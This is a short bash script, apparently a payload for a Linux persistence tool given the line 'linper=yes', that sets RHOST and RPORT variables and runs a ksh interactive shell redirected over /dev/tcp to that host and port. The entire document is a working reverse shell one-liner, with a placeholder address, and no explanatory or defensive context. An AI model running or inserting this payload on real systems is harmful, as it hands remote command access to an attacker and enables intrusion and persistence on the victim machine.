linper=yes

#!/bin/bash

export RHOST=0.0.0.0
export RPORT=12345
ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'
